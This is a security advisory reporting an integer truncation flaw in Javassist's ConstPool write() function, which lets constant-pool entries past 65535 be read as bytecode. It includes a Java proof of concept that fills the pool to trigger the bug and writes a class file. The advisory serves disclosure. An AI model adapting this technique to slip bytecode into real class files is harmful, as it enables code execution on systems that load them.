## Summary

Integer truncation in Javassist leads to local code execution

## Component

[Javassist](https://github.com/jboss-javassist/javassist)

## Affected versions

Javassist (,3.29.1)

## Description

The issue lies in the write() function of the ConstPool object. When writing the ConstPool into a class file, the length field is written as a short integer, but the numOfItems Variable is not checked to see if it is bigger than the maximum value of short (65535). If we try to write a class file with a ConstPool bigger than 65535, the elements from position 65535 onwards wouldnâ€™t be considered as part of the ConstPool, and will be interpreted as arbitrary bytecode. An attacker that can insert arbitrary integers into a classfile, could use this to insert malicious bytecode to the class, for example a constructor which will cause code execution when the class file is loaded



## PoC

```java
import javassist.NotFoundException; 
import javassist.bytecode.ClassFile; 
import javassist.bytecode.ConstPool; 
import java.io.DataOutputStream; 
import java.io.File;

import java.io.FileOutputStream; 
import java.io.IOException; 
public class JavassistIntTruncationExample 
{ 
	public static void main(String argv[]) throws IOException, NotFoundException { 
		File yourFile = new File("malicious.class"); 
		yourFile.createNewFile(); 
		FileOutputStream oFile = new FileOutputStream(yourFile, false); DataOutputStream stream = new DataOutputStream(oFile); 
		ClassFile clazz_file_before_write = new 
		ClassFile(false,"test",null); 
		ConstPool pool_before_write = 
		clazz_file_before_write.getConstPool(); 
		// Adding enough ints to cause integer truncation 
		for(int i = 0; i< 65527; i++) { 
			pool_before_write.addIntegerInfo(0xcafebabe); 
		} 
		// BUG: This integer will be added as arbitrary bytecode! 
		pool_before_write.addIntegerInfo(0xdeadbeef); 
		System.out.println("Constpool size" + pool_before_write.getSize()); clazz_file_before_write.write(stream); 
	} 
} 

```
